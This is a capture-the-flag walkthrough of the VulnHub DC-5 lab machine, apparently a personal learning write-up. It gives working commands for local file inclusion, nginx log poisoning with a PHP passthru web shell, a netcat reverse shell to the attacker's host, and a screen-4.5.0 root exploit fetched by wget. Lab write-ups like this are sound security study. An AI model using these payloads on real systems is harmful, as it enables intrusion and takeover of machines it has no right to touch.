# DC: 5
[VulnHub link](https://www.vulnhub.com/entry/dc-5,314/)  
By DCAU

## Enumeration ##
* As with the first 4 iterations of the DC-series, we are first greeted with a login page that requires users to specify both the username and the password:
![](/screenshots/dc-5/loginInitial.jpg)
* Common login credentials such as `admin:admin` and `admin:password` do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/dc-5/nmapScan.jpg)
* After eliminating our own IP address and our router gateway IP address, it is very likely that the vulnerable VM's IP address is `10.0.2.12`.
* The host is running 2 services, HTTP at port 80 and rpcbind at port 111. Both ports are found to be open.
* Run `nmap -p- -A 10.0.2.12`:
![](/screenshots/dc-5/hostFullScan.jpg)
* Looking at the services which the vulnerable VM is running, we can see an nginx web server running on port 80 (which is open), as with the previous iteration of the dc series.

## Exploring Nginx Service on Port 80 ##
* Opening `http://10.0.2.12` reveals a site with paragraphs of random sample texts greeting us:
![](/screenshots/dc-5/siteWebServer.jpg)
* At this point in time, I could not be more stuck. I tried using Burp Suite on the Contact form as was done in the previous walkthrough for DC-4, but to no avail.
* A hint that I got was that when I repeatedly submitted the Contact form, the copyright year at the bottom may differ:
![](/screenshots/dc-5/copyrightYears.jpg)
* It was either 2017, 2018, 2019 or 2020. Interesting. The copyright year on any of the other pages would be 2019.
* Even when I was repeatedly refreshing `http://10.0.2.12/thankyou.php` which had no parameters, the year was still changing. A contact form that is submitted would result in the URL being `http://10.0.2.12/thankyou.php?firstname=&lastname=&country=australia&subject=`.
* On hindsight, the only indication that I got from looking at the page source, is that the closing HTML tag for footer was rather out of place:
![](/screenshots/dc-5/contactFormSubmitPageSource.jpg)
* While I understood that we could modify the data (within the various options) being sent, what I did not know was that we could attempt our own options as well. Such an option would be `file`, where we would want to read the contents of specific files within the web server. It turns out that this vulnerability is called **Local File Inclusion** (LFI).
* Here is a [great explanation](https://roguecod3r.wordpress.com/2014/03/17/lfi-to-shell-exploiting-apache-access-log/) on how we will be exploiting this vulnerability to get our shell, courtesy of roguecod3r (author of post) and byzo (who suggested this article in his walkthrough).

## Exploring LFI ##
* After understanding this, we will now attempt to get the contents of `/etc/passwd`, by entering `http://10.0.2.12/thankyou.php?file=/etc/passwd`:
![](/screenshots/dc-5/etcPasswdFile.jpg)
* Interestingly, if we did not include any file to load in the parameter, the footer contents would disappear, i.e. no Copyright © 2019 would be retrieved.
* Also, `/etc/passwd` seems to be one of the common files used to test for LFI, because I guess virtually everyone would have that file on their web servers. Attempting to load a file that does not exist may lead us to be mistaken that LFI is not present.
* As much as we now know a list of users, we do not have a login page or ssh to attempt our logins.
* It turns out that to get our shell, we would have to exploit it through the *nginx access logs*.
* First, we have to find out where the access logs are located. A common location of the file is `/var/log/nginx/access.log`. Run: `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log`:
![](/screenshots/dc-5/nginxAccessLog.jpg)
* Note: For Apache2 web servers, the location is also likely to be the same, except that it would be found under the `apache2` directory in `/var/log` instead.
* We can now confirm that we are able to retrieve the access logs, which span many, many pages.
* I accessed `http://10.0.2.12/testing-out-that-i-am-able-to-read-the-access-logs`, just to test out what we know about the access logs - that these files record all requests processed by the server:
![](/screenshots/dc-5/nginxAccessLogTest.jpg)
* Note: The latest records are found at the bottom of the log file.
* Next, run `nc 10.0.2.12 80`, then enter `GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1`:
![](/screenshots/dc-5/emptyGETResponse.jpg)
* Note: I did not get back any response from my GET request, as compared to the walkthroughs by others who solved this challenge. They got back a response with status code `400 Bad Request`, where if you were to see the status code of my 'empty' GET request below, it is a `408 Request Timeut` error. Interesting.
* `passthru` allows us to execute an external program and display its raw output.
* Note: The browswer is not used to send this GET request because it will URL-encode the request, making it useless.
* Refresh the page, i.e. visit `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log` and we see that there is an 'empty' GET request, which is really the request made when we executed the PHP code:
![](/screenshots/dc-5/emptyGETRequest.jpg)
* After that, visit `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log&cmd=id` to confirm that we are able to run commands. We should expect to see the output of running `id` in the access logs, exactly at the log entry where our 'empty' GET request was made:
![](/screenshots/dc-5/commandExecutionAccessLogs.jpg)
* Note: Visiting the page with the parameter `cmd=id` immediately after sending the GET request via netcat will result in the output of `id` being displayed as the latest one. I visited a few pages in between for the example above to illustrate my point that the output of the command will only appear exactly where the netcat GET request was made.
![](/screenshots/dc-5/commandExecutionImmediateAccessLogs.jpg)

## Gaining Reverse Shell (from LFI) ##
* Next, we will establish our shell to the web server by running a netcat listener `nc -v -l -p 1234` on our Kali VM terminal, and then visiting `http://10.0.2.12/thankyou.php?file=/var/log/nginx/access.log&cmd=nc 10.0.2.15 1234 -c /bin/sh` on our browser:
![](/screenshots/dc-5/ncEstablishShell.jpg)
* Note: Replace `10.0.2.15` with the IP address of your Kali VM, `1234` with a port number of your choice just for the purpose of establishing this connection, and `/bin/sh` with `/bin/bash` if you would like (there is no difference between the 2 here).
* As expected, we are user `www-data` and it is time to find a way to escalate our privileges!
* Before we do so, run `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn our interactive TTY shell.
* Next, run `find / -user root -perm -4000 -print 2>/dev/null` to search for setuid binaries which we can possibly exploit:
![](/screenshots/dc-5/setuidBinaries.jpg)
* Having executed this `find` command many times over our past challenges, we are more or less able to distinguish if there are any unusual binaries in the output. Here, it is `/bin/screen-4.5.0`.

## Privilege Escalation (to root) ##
* Googling about /bin/screen-4.5.0 led me to find out about the existence of 2 exploits relating to it on Exploit DB - [41152](https://www.exploit-db.com/exploits/41152) and [41154](https://www.exploit-db.com/exploits/41154). I could not quite understand the former, so we will use the latter.
* To upload the exploit script, run `python -m SimpleHTTPServer 4567` on our Kali VM, then navigate to `/tmp` on our netcat shell before running `wget http://10.0.2.15:4567/41154.sh`:
![](/screenshots/dc-5/uploadExploitScript.jpg)
* The status code `200 OK` tells us that the upload is successful.
* Note: According to [Python For Beginners](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/), the SimpleHTTPServer module that comes with Python is a simple HTTP server that provides standard GET and HEAD request handlers. An advantage with the built-in HTTP server is that we do not have to install and configure anything.
* Note: `4567` is also a port number of your choice just for the purpose of establishing this connection.
* Once it has been downloaded to the web server /tmp directory, `chmod +x 41154.sh` to give it executable permissions.
* Running `./41154.sh` results in an error as shown in the boxed-up area:
![](/screenshots/dc-5/failedScreenExploit.jpg)
* Perhaps the exploit script could not be executed in one shot. Let us try to split the original script into its respective files by ourselves, and do the compilation manually.
* First, we will do a quick analysis of the original exploit script:
![](/screenshots/dc-5/exploitCode.jpg)
* In summary, the original exploit script is split into 3 files - 2 .c files and 1 script.
* We will next compile the 2 respective .c files, bearing in mind that the `/tmp` parts of the command (as indicated in the original exploit script) are removed because my version of files are stored in `/root`.
* Compile `libhax.c` using the command `gcc -fPIC -shared -ldl -o libhax.so libhax.c`:
![](/screenshots/dc-5/libhaxCompilation.jpg)
* Compile `rootshell.c` using the command `gcc -o rootshell rootshell.c`:
![](/screenshots/dc-5/rootshellCompilation.jpg)
* We will name our script `screenroot.sh`, although you can name it otherwise. This name is the file name of the original exploit script.
![](/screenshots/dc-5/screenRootScriptModified.jpg)
* Ensure that our SimpleHTTPServer is still running, and upload all 3 files to the vulnerable web server:
1. `wget http://10.0.2.15:4567/libhax.so`
2. `wget http://10.0.2.15:4567/rootshell`
3. `wget http://10.0.2.15:4567/screenroot.sh`
![](/screenshots/dc-5/uploadExploitFiles.jpg)
* `chmod +x screenroot.sh` to give it executable permissions:
![](/screenshots/dc-5/filesInTmpDirectory.jpg)
* For some unknown reason, I am unable to run it on one of my devices. Apparently there is a wrong ELF class, which I am unable to diagnose:
![](/screenshots/dc-5/exploitFinalUnknownFailure.jpg)
* What you should rightfully see when you run `./screenroot.sh`:
![](/screenshots/dc-5/privilegeEscalated.jpg)
* Congratulations, we are now `root`! Head to `/root`, and our flag is found in `thisistheflag.txt`:
![](/screenshots/dc-5/flag.jpg)

# Concluding Remarks
This challenge felt a lot shorter than any other vulnerable machines that we had attempted previously, but at the same time each step required a lot more targeted knowledge that one had to know, else it would be very hard to move forward.

1. Learnt about exploiting Local File Inclusion (LFI).
2. Learnt to deconstruct an exploit script, given that its original copy did not work for our circumstances.
3. Learnt about SimpleHTTPServer in conjunction with wget.

Does not seem like I learnt a lot in terms of quantity, but learning about LFI was a huge plus to me here!

**Note to self: Consider exploring why the Copyright year kept changing upon submission of the contact form.**

# References
1. https://bzyo.github.io/dc-5/